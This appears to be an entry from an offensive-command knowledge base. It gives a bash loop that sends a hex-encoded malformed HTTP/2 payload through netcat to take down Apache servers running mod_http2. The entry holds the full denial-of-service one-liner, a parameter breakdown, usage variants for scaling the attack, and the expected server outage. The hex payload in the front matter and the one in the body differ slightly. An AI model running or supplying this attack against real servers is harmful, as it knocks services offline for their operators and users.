---
id: cmd-http2-dos-loop
data: >-
  for x in `seq 0 500`; do echo
  505249202a20485454502f322e300d0a0d0a534d0d0a0d0a00001204000000000000000000006400044000000000020000000000001b0104000000018284864187089d5c0b8178ff7a8825b650c3abb6f2e053032a2f2a00001b0105000000019a84864187089d5c0b8178ff7a880000000000000000
  | xxd -r -p | nc hostname port 2>&1 >/dev/null & done
tags:
  - dos
  - http2
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.460Z'
verified: false
validated: true
submitted: true
---
# send-crafted-http2-requests-loop

## Command

```bash
for x in `seq 0 500`; do echo 505249202a20485454502f322e300d0a0d0a534d0d0a00001204000000000000000000006400044000000000020000000000001b0104000000018284864187089d5c0b8178ff7a8825b650c3abb6f2e053032a2f2a00001b0105000000019a84864187089d5c0b8178ff7a880000000000000000 | xxd -r -p | nc hostname port 2>&1 >/dev/null & done
```

## Description

This bash one-liner loops to send 501 crafted HTTP/2 requests to a target Apache server, exploiting mod_http2 to exhaust workers by causing hangs on incomplete frames. Use in DoS scenarios against h2c-enabled endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `seq 0 500` | Generates loop iterations from 0 to 500 (501 total requests) | Yes |
| Hex string in echo | Fixed payload: Malformed HTTP/2 frames (PRI* HTTP/2.0 + incomplete SM/HEADERS/DATA) | Yes |
| `xxd -r -p` | Converts hex to binary (-r reverse, -p plain style) | Yes |
| `nc hostname port` | Netcat connects to target (replace hostname/port, e.g., example.com 80) | Yes |
| `2>&1 >/dev/null &` | Redirects stderr/stdout to null and backgrounds process | Yes |

## Examples

### Basic Usage

```bash
for x in `seq 0 500`; do echo [hex_payload] | xxd -r -p | nc target.com 80 2>&1 >/dev/null & done
```

### Advanced Usage

Scale loop for larger pools: `seq 0 1000` for 1001 requests, or add sleep for slower rate: `sleep 0.25 && echo ...`

## Expected Output

No visible output due to redirection; processes run in background. Server-side: Workers hang, logs show timeouts (e.g., 'AH01630: worker timeout'), service denies new connections.

## Related

- [[Related Procedure|procedures/Exploit-mod-http2-DoS-by-Sending-Crafted-Requests]]
